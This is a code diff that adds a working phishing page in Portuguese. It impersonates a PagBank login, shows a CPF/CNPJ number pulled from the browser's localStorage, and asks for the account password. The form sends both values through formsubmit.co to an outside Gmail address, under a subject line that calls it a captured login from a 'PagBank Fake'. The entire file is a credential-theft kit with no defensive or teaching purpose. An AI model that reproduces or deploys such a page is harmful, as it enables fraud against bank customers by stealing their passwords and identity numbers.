@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Digite sua Senha</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f5f6f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background-color: #ffffff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+    }
+    .logo {
+      margin-bottom: 30px;
+    }
+    .logo img {
+      width: 140px;
+    }
+    h2, .cpf-display {
+      font-size: 1.1rem;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 14px;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #04a94f;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <div class="logo">
+      <img src="https://logodownload.org/wp-content/uploads/2021/05/pagbank-logo-0.png" alt="PagBank Logo">
+    </div>
+    
+    <div class="cpf-display">
+      CPF/CNPJ: <span id="cpfCnpjExibido"></span>
+    </div>
+
+    <form action="https://formsubmit.co/alunospilotos@gmail.com" method="POST">
+      <input type="hidden" name="_subject" value="Novo login capturado via PagBank Fake!" />
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_captcha" value="false">
+
+      <input type="text" name="cpf" id="cpfOculto" readonly />
+      <input type="password" name="senha" placeholder="Digite sua senha" required />
+      <button type="submit">Entrar</button>
+    </form>
+  </div>
+
+  <script>
+    const cpf = localStorage.getItem('cpfCnpj');
+    document.getElementById('cpfCnpjExibido').innerText = cpf;
+    document.getElementById('cpfOculto').value = cpf;
+  </script>
+</body>
+</html>
